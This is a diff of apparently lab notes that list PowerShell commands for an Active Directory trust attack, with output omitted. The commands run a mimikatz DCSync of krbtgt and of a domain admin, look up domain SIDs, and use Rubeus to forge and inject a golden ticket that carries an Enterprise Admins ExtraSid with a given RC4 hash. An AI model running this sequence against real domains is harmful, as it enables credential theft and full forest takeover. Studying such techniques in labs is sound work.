@@ -6,73 +6,49 @@
 
 > Terminal output is omitted; only commands & scripts are captured.
 
-## 1. `powershell` _(output omitted)_
-
 ```powershell
  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
 ```
-
-## 2. `powershell` _(output omitted)_
 
 ```powershell
 Get-DomainSID
 ```
 
-## 3. `powershell` _(output omitted)_
-
 ```powershell
 Get-DomainGroup -Domain {{DOMAIN_UPPER}} -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
 
-## 4. `powershell` _(output omitted)_
-
 ```powershell
 ls \\academy-ea-dc01.{{DOMAIN}}\c$
 ```
-
-## 5. `powershell` _(output omitted)_
 
 ```powershell
 mimikatz.exe
 ```
 
-## 6. `powershell` _(output omitted)_
-
 ```powershell
 klist
 ```
 
-## 7. `powershell` _(output omitted)_
-
 ```powershell
 ls \\academy-ea-dc01.{{DOMAIN}}\c$
 ```
 
-## 8. `powershell` _(output omitted)_
-
 ```powershell
 ls \\academy-ea-dc01.{{DOMAIN}}\c$
 ```
-
-## 9. `powershell` _(output omitted)_
 
 ```powershell
  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.{{DOMAIN_UPPER}} /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
 ```
 
-## 10. `powershell` _(output omitted)_
-
 ```powershell
 klist
 ```
 
-## 11. `powershell` _(output omitted)_
-
 ```powershell
 .\mimikatz.exe
 ```
-
-## 12. `powershell`
 
 ```powershell
 mimikatz # lsadump::dcsync /user:{{DOMAIN_NB}}\lab_adm /domain:{{DOMAIN_UPPER}}
